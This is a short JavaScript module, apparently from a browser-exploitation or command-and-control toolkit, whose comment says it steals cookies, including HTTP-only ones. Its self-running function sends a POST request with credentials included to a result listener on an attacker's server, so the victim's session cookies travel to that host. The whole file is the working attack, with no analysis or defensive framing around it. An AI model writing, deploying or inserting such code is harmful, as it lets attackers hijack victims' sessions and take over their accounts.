/*
Module to steal cookies, including HTTP Only ones
*/

(function getCookies() {
    let formData = new FormData();
    formData.append('result', 'dummy');
    formData.append('module_value', 'cookie_stealer.js')

    fetch(`http://${serverAddress}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()